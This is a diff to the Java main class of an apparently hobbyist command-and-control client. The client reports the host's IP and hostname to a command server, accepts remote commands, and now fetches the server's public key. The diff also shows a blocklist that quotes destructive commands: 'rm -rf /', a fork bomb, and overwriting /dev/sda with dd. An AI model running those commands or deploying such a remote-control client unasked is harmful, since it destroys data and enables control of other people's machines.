@@ -3,11 +3,11 @@ import com.esotericsoftware.kryonet.Client;
 import com.esotericsoftware.kryonet.Connection;
 import com.esotericsoftware.kryonet.Listener;
 
-import java.io.BufferedReader;
-import java.io.IOException;
-import java.io.InputStreamReader;
+import java.io.*;
 import java.net.InetAddress;
+import java.net.MalformedURLException;
 import java.net.URL;
+import java.security.PublicKey;
 import java.util.Arrays;
 import java.util.List;
 import java.util.Timer;
@@ -41,14 +41,15 @@ public class Main {
     private static boolean authenticated = false;
 
     //List of classes to be registered with kryo for (de)serialization
-    public static final List<Class> KRYO_CLASSES = Arrays.asList(ReconnectRequest.class, AuthenticationConfirmation.class, Command.class, CommandResponse.class, KeepAlive.class, RegisterRequest.class, KillRequest.class);
+    public static final List<Class> KRYO_CLASSES = Arrays.asList(byte[].class,PublicKeyTransmission.class, KeyRequest.class, ReconnectRequest.class, AuthenticationConfirmation.class, Command.class, CommandResponse.class, KeepAlive.class, RegisterRequest.class, KillRequest.class);
 
 
     //TODO More substantial way to block unsafe commands
     public static List<String> blockedCommands = Arrays.asList("rm -rf /", "rm -rf /home", ":(){ :|:& };:", "shutdown", "> /dev/sda", "/dev/null", "/dev/sda", "dd if=/dev/random of=/dev/sda", "/dev/random", "/root/,ssh", "ssh-copy-id", "ssh");
 
     public static void main(String[] args) {
-        initialize();
+        pseudoSecurelyObtainPublicKey();
+        //initialize();
 
 
     }
@@ -184,7 +185,7 @@ public class Main {
         client.addListener(new Listener() {
             public void received(Connection connection, Object object) {
                 if (object instanceof AuthenticationConfirmation) {
-                    if (!authenticationStatusLock)
+                    if ((!authenticationStatusLock) && connection.getRemoteAddressTCP().getAddress().getHostAddress().equals(COMMANDIP))
                         authenticated = true;
                     log("Successfully authenticated by command");
 
@@ -325,7 +326,7 @@ public class Main {
     It is required to use an external service like amazonaws because it is not possible to programatically obtain the external ipv4
     address of a machine under NAT
      */
-    public static String getIp() throws Exception {
+    public static String getIp() throws IOException {
         URL whatismyip = new URL("http://checkip.amazonaws.com");
         BufferedReader in = null;
         try {
@@ -355,5 +356,112 @@ public class Main {
         for (Class c : KRYO_CLASSES) kryo.register(c);
         log("Registered kryo classes");
     }
+
+    /*
+   Send a request to the server to obtain a copy of its public key. Verify that it is the actual, proper server that we are connecting to
+    (somehow)?
+    //TODO A more thorough and cryptographically secure implementation of communication security
+    */
+    private static void pseudoSecurelyObtainPublicKey() {
+        log("Attempting to obtain public key");
+
+        client = new Client();
+        client.start();
+        registerClasses();
+        failoverUtil();
+        log("Client Started");
+        try {
+            log("Connecting client");
+            client.connect(5000, COMMANDIP, COMMANDPORT);
+            log("Client connected");
+
+
+            client.addListener(new Listener() {
+                public void received(Connection connection, Object object) {
+                    if (object instanceof PublicKeyTransmission) {
+                        PublicKeyTransmission publicKeyTransmission = (PublicKeyTransmission)object;
+                        log("Received public key transmission");
+                        if (publicKeyTransmission.getIpAddress().equals(COMMANDIP)) {
+                            log("Verified public key is from COMMANDIP");
+
+
+                            String strFilePath = "CNCKeys/publicKey";
+                            log("Attempting to write public key to file at "+strFilePath);
+                            try {
+                                new File("CNCKeys").mkdirs();
+                                FileOutputStream fos = new FileOutputStream(strFilePath);
+                                for (byte b:publicKeyTransmission.getStream()) {
+                                    System.out.println((char)b);
+                                }
+                                fos.write(publicKeyTransmission.getStream());
+                                fos.close();
+                                log("Successfully wrote byte stream to file");
+                                client.close();
+                                client.stop();
+                                log("Initializing main program");
+                                initialize();
+                            }
+                            catch(FileNotFoundException ex)   {
+                                System.out.println("FileNotFoundException : " + ex);
+                                error("Failed to find file");
+                                client.stop();
+                                System.exit(0);
+                            }
+                            catch(IOException ioe)  {
+                                ioe.printStackTrace();
+                                System.out.println("IOException : " + ioe);
+                                error("Error while writing byte stream to file");
+                                client.stop();
+                                System.exit(0);
+                            }
+
+
+
+
+
+
+                        }
+
+
+                    }
+                }
+            });
+
+
+
+
+
+
+            log("Sending KeyRequest");
+            client.sendTCP(new KeyRequest(getIp(), InetAddress.getLocalHost().getHostName()));
+
+
+
+
+
+
+        } catch (IOException e) {
+            e.printStackTrace();
+            error("Client could not connect to command or craft KeyRequest");
+            System.exit(0);
+        }
+
+
+    }
+
+    private static void failoverUtil() {
+        Timer timer = new Timer("Timer");
+        TimerTask task = new TimerTask() {
+            public void run() {
+                //TODO failovers
+            }
+        };
+
+        timer.scheduleAtFixedRate(task,0,100000);
+
+
+
+    }
+
 
 }
